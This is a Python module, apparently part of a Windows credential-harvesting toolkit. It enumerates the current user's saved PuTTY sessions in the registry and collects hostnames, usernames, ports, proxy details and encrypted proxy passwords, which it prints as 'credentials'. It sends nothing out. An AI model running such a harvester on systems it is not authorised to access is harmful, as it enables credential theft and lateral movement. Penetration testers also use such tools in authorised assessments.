#!/usr/bin/env python3
"""
PuTTY Credential Miner
Extract PuTTY saved sessions and connection information
"""

import winreg
from typing import List, Dict

from ..utils import safe_open_key, safe_query_value, enumerate_subkeys


class PuTTYMiner:
    """
    Extract PuTTY saved sessions
    
    Location: HKCU\Software\SimonTatham\PuTTY\Sessions
    Privilege: Current user access
    """
    
    MINER_NAME = "putty"
    REQUIRES_ADMIN = False
    
    def __init__(self):
        self.key_path = r"Software\SimonTatham\PuTTY\Sessions"
    
    def mine(self) -> List[Dict]:
        """
        Extract PuTTY sessions
        
        Returns:
            List of credential dictionaries
        """
        print(f"\n[*] Mining PuTTY sessions...")
        print(f"[*] Location: HKCU\\{self.key_path}")
        
        credentials = []
        
        key = safe_open_key(winreg.HKEY_CURRENT_USER, self.key_path)
        
        if not key:
            print(f"[-] No PuTTY sessions found")
            return credentials
        
        try:
            # Enumerate session names
            session_names = enumerate_subkeys(key)
            
            if not session_names:
                print(f"[-] No saved PuTTY sessions found")
                return credentials
            
            print(f"[+] Found {len(session_names)} PuTTY session(s)")
            
            for session_name in session_names:
                session_key = safe_open_key(key, session_name)
                
                if not session_key:
                    continue
                
                try:
                    session_data = {
                        'source': 'PuTTY Session',
                        'location': f'HKCU\\{self.key_path}\\{session_name}',
                        'session_name': session_name
                    }
                    
                    # Extract hostname
                    hostname_result = safe_query_value(session_key, "HostName")
                    if hostname_result:
                        session_data['hostname'] = hostname_result[0]
                    
                    # Extract username
                    username_result = safe_query_value(session_key, "UserName")
                    if username_result:
                        session_data['username'] = username_result[0]
                    
                    # Extract port
                    port_result = safe_query_value(session_key, "PortNumber")
                    if port_result:
                        session_data['port'] = port_result[0]
                    
                    # Extract proxy settings
                    proxy_host_result = safe_query_value(session_key, "ProxyHost")
                    if proxy_host_result:
                        session_data['proxy_host'] = proxy_host_result[0]
                    
                    proxy_user_result = safe_query_value(session_key, "ProxyUsername")
                    if proxy_user_result:
                        session_data['proxy_username'] = proxy_user_result[0]
                    
                    # Proxy password (encrypted with weak algorithm)
                    proxy_pass_result = safe_query_value(session_key, "ProxyPassword")
                    if proxy_pass_result:
                        session_data['proxy_password_encrypted'] = proxy_pass_result[0]
                    
                    # Only add if we found useful information
                    if len(session_data) > 3:  # More than just source, location, session_name
                        credentials.append(session_data)
                        
                        print(f"[+] Found PuTTY session:")
                        print(f"    Session: {session_name}")
                        
                        if 'hostname' in session_data:
                            print(f"    Host: {session_data['hostname']}")
                        
                        if 'username' in session_data:
                            print(f"    Username: {session_data['username']}")
                        
                        if 'port' in session_data:
                            print(f"    Port: {session_data['port']}")
                        
                        if 'proxy_password_encrypted' in session_data:
                            print(f"    Note: Proxy password encrypted (weak algorithm)")
                
                finally:
                    winreg.CloseKey(session_key)
        
        finally:
            winreg.CloseKey(key)
        
        return credentials
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this miner"""
        return {
            'name': 'putty',
            'description': 'Extract PuTTY saved session information',
            'requires_admin': False,
            'requires_system': False,
            'registry_location': r'HKCU\Software\SimonTatham\PuTTY\Sessions',
            'credential_types': ['hostname', 'username', 'encrypted proxy password'],
            'notes': [
                'PuTTY stores session configuration in registry',
                'Hostnames and usernames stored in plaintext',
                'Proxy passwords encrypted but weak algorithm',
                'SSH keys stored separately (not in registry)',
                'Current user access only'
            ]
        }
